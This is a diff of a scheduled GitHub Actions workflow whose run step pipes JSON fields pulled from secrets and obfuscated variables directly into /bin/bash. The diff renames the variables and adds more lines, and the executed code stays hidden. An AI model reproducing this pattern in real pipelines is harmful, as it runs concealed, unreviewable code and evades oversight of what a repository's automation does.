@@ -1,9 +1,8 @@
 name: fangzhangdx
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 3/6 * * *'
+    - cron: '50 0/6 * * *'
 
 jobs:
   build:
@@ -12,12 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: fangzhangdx
         env:
-          wr94890: ${{ secrets.wr94890 }}
+          kxw04872: ${{ secrets.kxw04872 }}
         run: |
-          echo $wr94890 | jq -r .w85071 | /bin/bash
-          echo $tq598 | jq -r .mpdk36 | /bin/bash
-          echo $jhgcr501 | jq -r .tph3 | /bin/bash
-          echo $s43845 | jq -r .i7105 | /bin/bash
-          echo $a0 | jq -r .eril4 | /bin/bash
-          echo $msez8668 | jq -r .al9940 | /bin/bash
+          echo $kxw04872 | jq -r .zpwc747 | /bin/bash
+          echo $sbf39 | jq -r .l2356 | /bin/bash
+          echo $h84 | jq -r .wx9 | /bin/bash
+          echo $y9 | jq -r .y9311 | /bin/bash
+          echo $wawtw7455 | jq -r .qp20655 | /bin/bash
+          echo $ega8514 | jq -r .xks581 | /bin/bash
+          echo $gtll3 | jq -r .wabcc1 | /bin/bash
+          echo $mz8 | jq -r .jm69 | /bin/bash
+          echo $hcixe269 | jq -r .zu1 | /bin/bash
+          echo $yisg171 | jq -r .jd9403 | /bin/bash
+          echo $ayf58913 | jq -r .yahb03 | /bin/bash
+          echo $i62122 | jq -r .dnawn567 | /bin/bash
+          echo $en7 | jq -r .r60 | /bin/bash
 
